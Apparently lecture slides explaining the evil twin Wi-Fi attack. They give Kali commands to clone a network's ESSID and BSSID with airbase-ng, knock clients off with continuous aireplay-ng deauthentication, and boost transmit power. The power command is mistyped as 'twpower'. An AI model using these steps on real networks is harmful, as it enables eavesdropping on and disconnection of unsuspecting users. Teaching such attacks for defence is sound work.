# What is an Evil Twin attack?
<!-- An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate, set up to eavesdrop on wireless communications.[1] The evil twin is the wireless LAN equivalent of the phishing scam. -->
- An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate
- Set up to eavesdrop on wireless communications.

# How to setup an Evil Twin

- Configure it exactly the same way as an existing network
    - Same ESSID
    - Same Security Settings
- Overpower the existing access points

# Evil Twin in Kali
- install bridge utils
```bash
apt-get install bridge-utils
```
- Start monitoring interface
```bash
airmon-ng start <interface>
    ```
- Create the evil twin
```bash
airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> <interface name>
```

.footnote[Slides can be accessed through https://git.io/vFKre]
---
# Evil Twin in Kali

- Deauthentication or Bumping Him Off
```bash
aireplay-ng --deauth 0 -a <BSSID> mon0 --ignore-negative-one
```
- Turn up the Power!
```bash
iwconfig <interface> twpower <power>
```

.note[before turning the power up check MAXIMUM WIFI TRANSMISSION POWER IN YOUR COUNTRY]
